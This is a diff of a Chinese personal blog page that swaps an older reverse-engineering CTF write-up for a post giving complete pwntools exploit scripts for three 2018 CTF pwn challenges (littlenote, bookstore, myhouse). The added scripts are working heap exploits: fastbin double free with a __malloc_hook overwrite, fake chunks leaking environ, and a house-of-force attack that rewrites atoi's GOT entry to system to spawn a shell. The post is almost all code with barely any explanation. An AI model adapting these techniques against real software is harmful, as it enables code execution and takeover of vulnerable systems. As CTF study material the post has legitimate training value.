@@ -4,38 +4,24 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>一个简单的逆向 | Reshahar的博客</title>
+    <title>2018铁三赛决赛三道pwn题exp | Reshahar的博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="Reshahar">
     
 
     
-    <meta name="description" content="一个ctf的逆向题">
-<meta name="keywords" content="逆向,ctf">
+    <meta name="description" content="2018铁三赛决赛三道pwn题exp">
+<meta name="keywords" content="pwn,exp,heap,house-of-force">
 <meta property="og:type" content="article">
-<meta property="og:title" content="一个简单的逆向">
-<meta property="og:url" content="http://Reshahar.github.io/2017/04/13/一个简单的逆向/index.html">
+<meta property="og:title" content="2018铁三赛决赛三道pwn题exp">
+<meta property="og:url" content="http://Reshahar.github.io/2018/12/12/2018铁三赛决赛三道pwn题exp/index.html">
 <meta property="og:site_name" content="Reshahar的博客">
-<meta property="og:description" content="一个ctf的逆向题">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202200310502">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202200538927">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202200551364">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202200614099">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202200627115">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202200646193">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202200706944">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202200725679">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202200739569">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202200815445">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202200826304">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202200836367">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202200851476">
-<meta property="og:updated_time" content="2017-04-13T14:08:42.980Z">
+<meta property="og:description" content="2018铁三赛决赛三道pwn题exp">
+<meta property="og:updated_time" content="2018-12-12T15:08:38.959Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="一个简单的逆向">
-<meta name="twitter:description" content="一个ctf的逆向题">
-<meta name="twitter:image" content="http://img.blog.csdn.net/20161202200310502">
+<meta name="twitter:title" content="2018铁三赛决赛三道pwn题exp">
+<meta name="twitter:description" content="2018铁三赛决赛三道pwn题exp">
 
     
     <link rel="alternative" href="/atom.xml" title="Reshahar的博客" type="application/atom+xml">
@@ -96,14 +82,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2017/04/13/一个简单的逆向/" title="一个简单的逆向" itemprop="url">一个简单的逆向</a>
+      <a href="/2018/12/12/2018铁三赛决赛三道pwn题exp/" title="2018铁三赛决赛三道pwn题exp" itemprop="url">2018铁三赛决赛三道pwn题exp</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/" title="Reshahar" target="_blank" itemprop="author">Reshahar</a>
 		
   <p class="article-time">
-    <time datetime="2017-04-13T14:00:24.000Z" itemprop="datePublished"> 发表于 2017-04-13</time>
+    <time datetime="2018-12-12T14:56:28.000Z" itemprop="datePublished"> 发表于 2018-12-12</time>
       
      &nbsp
      <span id="busuanzi_container_page_pv" style="display:none">
@@ -117,29 +103,288 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-littlenote"><span class="toc-number">1.</span> <span class="toc-text">0x01 littlenote</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-bookstore"><span class="toc-number">2.</span> <span class="toc-text">0x02 bookstore</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-myhouse"><span class="toc-number">3.</span> <span class="toc-text">0x03 myhouse</span></a></li></ol>
 		
 		</div>
 		
-		<p>一个ctf的逆向题</p>
+		<p>2018铁三赛决赛三道pwn题exp</p>
 <hr>
 <a id="more"></a>
-<p>首先运行程序观察程序的提示信息 可以看到程序首先<br> <img src="http://img.blog.csdn.net/20161202200310502" alt=""><br>一个字符串提示  随便输一个 ，出现另一个字符串u  r  wrong<br>然后<br>OD载入程序，字符串查找<br><img src="http://img.blog.csdn.net/20161202200538927" alt=""><br>看到提示的字符串，单击进入f2 下段点，运行程序，断在<br>单步 跟下来<br><img src="http://img.blog.csdn.net/20161202200551364" alt=""><br>读取字符函数getch()  随便输入一个假码，<br> <img src="http://img.blog.csdn.net/20161202200614099" alt=""><br>eax  的值正是输入的假码ascii的码，可以看出这是一个存储的过程<br><img src="http://img.blog.csdn.net/20161202200627115" alt=""><br>继续单步向下<br> <img src="http://img.blog.csdn.net/20161202200646193" alt=""><br>输出函数printf<br> <img src="http://img.blog.csdn.net/20161202200706944" alt=""><br>向上 跳了回去  这是一个输入的过程   没有不是关键的比较算法，直接在下一句，下断直接 运行过去<br> <img src="http://img.blog.csdn.net/20161202200725679" alt=""><br>这个比较 多次调试，可以发现这是一个字符长度的比较 然后 看来这个注册码的长度是17位<br> <img src="http://img.blog.csdn.net/20161202200739569" alt=""><br>这块就能看出这个程序的算法，很简单就是在12feb4地址开始每个四个字节，读取一个数，在后面字符串swfxc{gdv}fwfctslydRddoepsckaNDMSRITPNsmr1_=2cdsef66246087138<br>中以上面地址的数为下标检索字符串<br>剩下的写python脚本<br> <img src="http://img.blog.csdn.net/20161202200815445" alt=""></p>
-<p>跑出来感觉有点不对，放到程序里运行一个果然不对 ，<br>重新载入OD ，运行，之前的算法确实是的<br> <img src="http://img.blog.csdn.net/20161202200826304" alt=""><br>向后才发现还有比较   跟踪一下地址发现这个字符是在我们输入的字符之后<br>看来这后面还有一些字符，<br> <img src="http://img.blog.csdn.net/20161202200836367" alt=""><br>根据比较，可以看出来剩下的几个字符就是那几个ascii码，就是1024｝<br>到此就搞定了<br> <img src="http://img.blog.csdn.net/20161202200851476" alt=""></p>
-  
+<h3 id="0x01-littlenote"><a href="#0x01-littlenote" class="headerlink" title="0x01 littlenote"></a>0x01 littlenote</h3><p>double free和写malloc_hook</p>
+<pre><code>from pwn import *
+
+#context.log_level=&quot;debug&quot;
+p = process(&quot;./littlenote&quot;)
+libc = ELF(&quot;./libc.so.6&quot;)
+
+def add(data):
+    p.recvuntil(&quot;choice:&quot;)
+    p.sendline(str(1))
+    p.recvuntil(&quot;your note&quot;)
+    p.send(data)
+    p.recvuntil(&quot;keep your note?&quot;)
+    p.send(&quot;Y\x00&quot;)
+
+def show(idx):
+    p.recvuntil(&quot;choice:&quot;)
+    p.sendline(str(2))
+    p.recvuntil(&quot;show?&quot;)
+    p.sendline(str(idx))
+
+def dele(idx):
+    p.recvuntil(&quot;choice:&quot;)
+    p.sendline(str(3))
+    p.recvuntil(&quot;delete?&quot;)
+    p.sendline(str(idx))
+
+add(&quot;A&quot;*0x10)
+add(&quot;B&quot;*0x10)
+add(&quot;C&quot;*0x10)
+add(&quot;D&quot;*0x10+p64(0)+p64(0x51))
+dele(1)
+dele(0)
+dele(1)
+show(0)
+p.recvline()
+heap = u64(p.recvuntil(&quot;\n&quot;,drop=True).ljust(8,&quot;\x00&quot;))
+print hex(heap)
+add(p64(heap+0x10)+p64(0x71))
+add(&quot;\x00&quot;)
+add(p64(heap+0x10)+p64(0x71))
+add(&quot;F&quot;*0x50+p64(0)+p64(0x91))
+dele(2)
+show(2)
+p.recvline()
+main = u64(p.recvuntil(&quot;\n&quot;,drop=True).ljust(8,&quot;\x00&quot;))
+libc_addr = (main - 88) - 0x3C4B20
+print hex(libc_addr)
+malloc_hook = libc_addr + libc.symbols[&apos;__malloc_hook&apos;]
+print hex(malloc_hook)
+add(&quot;1&quot;*0x10) #8
+add(&quot;2&quot;*0x10) #9
+add(&quot;3&quot;*0x10)
+dele(9)
+dele(8)
+dele(9)
+add(p64(malloc_hook-27-0x8))
+add(&quot;5&quot;*0x10)
+add(p64(malloc_hook-27-0x8))
+one_gadget = 0xf0274
+add(&quot;A&quot;*19+p64(libc_addr + one_gadget))
+p.recvuntil(&quot;:&quot;)
+p.sendline(str(1))
+p.interactive()
+</code></pre><h3 id="0x02-bookstore"><a href="#0x02-bookstore" class="headerlink" title="0x02 bookstore"></a>0x02 bookstore</h3><p>在bss段和stack上伪造chunk</p>
+<pre><code>from pwn import *
+
+def ru(data,drop=False):
+    return p.recvuntil(data,drop=drop)
+
+def rl():
+    return p.recvline()
+
+def ra():
+    return p.recvall()
+
+def r(l):
+    return p.recv(l)
+
+def sl(data):
+    p.sendline(data)
+
+def s(data):
+    p.send(data)
+
+def ga(data,rd=&quot;\x0a&quot;):
+    ru(data)
+    return u64(ru(rd,drop=True).ljust(8,&quot;\x00&quot;))
+
+def g():
+    gdb.attach(p)
+    raw_input()
+
+def ri():
+    raw_input()
+
+def add(author,l,book):
+    ru(&quot;choice:&quot;)
+    sl(str(1)+&quot;\x00&quot;*0x7)
+    ru(&quot;author&quot;)
+    sl(author)
+    ru(&quot;long&quot;)
+    sl(str(l))
+    ru(&quot;book?&quot;)
+    sl(book)
+
+def read(idx):
+    ru(&quot;:&quot;)
+    sl(str(3))
+    ru(&quot;sell&quot;)
+    sl(str(idx))
+
+def sell(idx):
+    ru(&quot;:&quot;)
+    sl(str(2))
+    ru(&quot;sell&quot;)
+    sl(str(idx))
+
+def et():
+    ru(&quot;:&quot;)
+    sl(str(4))
+
+if __name__ == &apos;__main__&apos;:
+    #context.log_level = &quot;debug&quot;
+    libc = ELF(&quot;./libc.so.6&quot;)
+    p = process(&quot;./bookstore&quot;)
+    add(&quot;A&quot;*0x10,0x10,&quot;1&quot;*0x8)
+    add(&quot;B&quot;*0x10,0x40,&quot;2&quot;*0x10)
+    add(&quot;C&quot;*0x10,0x40,&quot;3&quot;*0x10) 
+    add(&quot;D&quot;*0x10,0x40,&quot;4&quot;*0x10) 
+    sell(0)
+    add(p64(0)+p64(0x51),0,p64(0)*3+p64(0xa1))
+    sell(1)
+    add(&quot;W&quot;*0x10,0x40,&apos;6&apos;*8)
+    read(1)
+    main = ga(&quot;6&quot;*0x8)
+    libc_addr = (main - 232) - 0x3C4B20 
+    print hex(libc_addr)
+    env = libc_addr + libc.symbols[&apos;environ&apos;]
+    print hex(env)
+    sell(0)
+    sell(1)
+    add(p64(0)+p64(0x51),0,p64(0)*3+p64(0x51)+p64(0x602060))
+    add(&quot;X&quot;*0x10,0x40,&apos;2&apos;*0x10)
+    add(&quot;Z&quot;*0x10,0x40,p64(0)*2+p64(env))
+    read(0)
+    stack = ga(&quot;name:&quot;)
+    print hex(stack)
+    fake = stack - 0x110
+    print hex(fake)
+    one = libc_addr + 0x45216
+    add(&quot;A&quot;*0x10,0x10,&quot;1&quot;*0x8)
+    add(&quot;B&quot;*0x10,0x20,&quot;2&quot;*0x10)
+    add(&quot;C&quot;*0x10,0x20,&quot;3&quot;*0x10) 
+    sell(5)
+    sell(6)
+    add(&apos;s&apos;*0x10,0,p64(0)*3+p64(0x31)+p64(fake))
+    add(&quot;B&quot;*0x10,0x20,&quot;2&quot;*0x10)
+    add(&apos;A&apos;*0x10,0x20,p64(0)+p64(0x400c70)+p64(one)) 
+    et()
+    p.interactive()
+</code></pre><h3 id="0x03-myhouse"><a href="#0x03-myhouse" class="headerlink" title="0x03 myhouse"></a>0x03 myhouse</h3><p>一个任意地址写null漏洞</p>
+<pre><code>from pwn import *
+
+def ru(data,drop=False):
+    return p.recvuntil(data,drop=drop)
+
+def rl():
+    return p.recvline()
+
+def ra():
+    return p.recvall()
+
+def r(l):
+    return p.recv(l)
+
+def sl(data):
+    p.sendline(data)
+
+def s(data):
+    p.send(data)
+
+def ga(data,rd=&quot;\x0a&quot;):
+    ru(data)
+    return u64(ru(rd,drop=True).ljust(8,&quot;\x00&quot;))
+
+def g():
+    gdb.attach(p)
+    raw_input()
+
+def ri():
+    raw_input()
+
+def gp():
+    print proc.pidof(p)[0]
+    ri()
+
+def add(n,hn,hs1,hs,hd):
+    ru(&quot;What&apos;s your name?&quot;)
+    s(n)
+    ru(&quot;name of your house?&quot;)
+    s(hn)
+    ru(&quot;size of your house?&quot;)
+    s(str(hs1))
+    ru(&quot;Too large!&quot;)
+    s(str(hs))
+    ru(&quot;description:\n&quot;)
+    s(hd)
+
+def broom(rs):
+    ru(&quot;choice:&quot;)
+    sl(str(1))
+    ru(&quot;size of your room&quot;)
+    sl(str(rs))
+
+def droom(rd):
+    ru(&quot;choice:&quot;)
+    sl(str(2))
+    ru(&quot;more shining&quot;)
+    sl(rd)
+
+def view():
+    ru(&quot;choice:&quot;)
+    sl(str(3))
+
+if __name__ == &apos;__main__&apos;:
+    # context.log_level = &quot;debug&quot;
+    libc = ELF(&quot;./libc.so.6&quot;)
+    p = process(&quot;./myhouse&quot;)
+    top = 0x3c4b78
+    size = 0x201000
+    ps = size - 0x10 + top + 1
+    # mmap to libc before, modify top chunk low bit to null
+    add(&quot;A&quot;*0x20 ,&quot;1&quot;*0xf0+p64(0)+p64(0xffffffffffffffff),ps,0x200000,&apos;2&apos;*0x20)
+    view()
+    heap = ga(&quot;A&quot;*0x20)
+    bss = 0x6020b0 
+    hs = bss - (heap + 0x100)
+    print hex(heap)
+    print hex(hs)
+    # modify top chunk to bss segment
+    broom(hs)
+    # alloc chunk in bss segment 
+    broom(0x60)
+    atoi = 0x602058
+    pay = p64(atoi) + p64(atoi) + p64(8)
+    # modify the ptr to got
+    droom(pay)
+    # leak atoi really addring
+    view()
+    atoi_addr = ga(&quot;description:\x0a&quot;)
+    print hex(atoi_addr)
+    system_addr = atoi_addr -libc.symbols[&apos;atoi&apos;] + libc.symbols[&apos;system&apos;]
+    print hex(system_addr)
+    # modify got of atoi to system addr
+    droom(p64(system_addr))
+    ru(&quot;choice:&quot;)
+    # get shell
+    s(&quot;/bin/sh\x00&quot;)
+    ru(&quot;choice:&quot;)    
+    p.interactive()
+</code></pre>  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/逆向工程/">逆向工程</a>
+  <a class="article-category-link" href="/categories/ctf-pwn/">ctf-pwn</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/逆向/">逆向</a><a href="/tags/ctf/">ctf</a>
+  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/exp/">exp</a><a href="/tags/heap/">heap</a><a href="/tags/house-of-force/">house-of-force</a>
   </div>
 
 </div>
@@ -148,7 +393,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://Reshahar.github.io/2017/04/13/一个简单的逆向/" data-title="一个简单的逆向 | Reshahar的博客" data-tsina="null" class="share clearfix">
+	  <div data-url="http://Reshahar.github.io/2018/12/12/2018铁三赛决赛三道pwn题exp/" data-title="2018铁三赛决赛三道pwn题exp | Reshahar的博客" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -162,21 +407,13 @@
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/2017/04/13/Kali 64位 安装32位库并编译程序/" title="Kali 64位 安装32位库并编译程序">
+ <a href="/2018/03/27/2018强网杯pwn之opm解题思路/" title="2018强网杯pwn之opm解题思路">
   <strong>上一篇：</strong><br/>
   <span>
-  Kali 64位 安装32位库并编译程序</span>
+  2018强网杯pwn之opm解题思路</span>
 </a>
 </div>
 
-
-<div class="next">
-<a href="/2017/04/13/Linux x86 栈溢出/"  title="linux x86 栈溢出">
- <strong>下一篇：</strong><br/> 
- <span>linux x86 栈溢出
-</span>
-</a>
-</div>
 
 </nav>
 
@@ -188,7 +425,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-littlenote"><span class="toc-number">1.</span> <span class="toc-text">0x01 littlenote</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-bookstore"><span class="toc-number">2.</span> <span class="toc-text">0x02 bookstore</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-myhouse"><span class="toc-number">3.</span> <span class="toc-text">0x03 myhouse</span></a></li></ol>
  
   </div>
 
